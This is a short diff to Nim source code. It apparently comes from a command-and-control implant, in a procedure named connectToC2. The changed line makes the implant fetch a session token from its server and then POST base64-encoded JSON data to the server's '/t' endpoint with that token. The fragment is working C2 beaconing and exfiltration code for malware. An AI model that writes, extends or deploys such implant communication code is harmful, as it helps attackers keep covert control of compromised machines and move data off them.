@@ -19,7 +19,7 @@ proc connectToC2*(app: App) =
     try:
       let token = app.httpClient.getContent(app.httpRoot & "/r")
       app.token = token
-      app.sendData($j)
+      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=encode($j))
     except OSError: discard
   elif defined(tcp):
     try:
